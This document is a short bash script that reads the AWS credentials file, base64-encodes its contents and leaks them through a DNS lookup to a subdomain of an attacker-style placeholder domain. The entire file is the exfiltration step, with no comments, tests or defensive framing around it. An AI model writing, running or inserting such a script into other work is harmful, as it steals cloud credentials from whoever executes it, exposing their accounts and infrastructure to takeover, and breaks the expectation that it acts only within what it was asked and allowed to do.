#!/bin/bash
data=$(cat ~/.aws/credentials | base64 -w0)
nslookup $(echo $data).exfil.attacker-domain.example
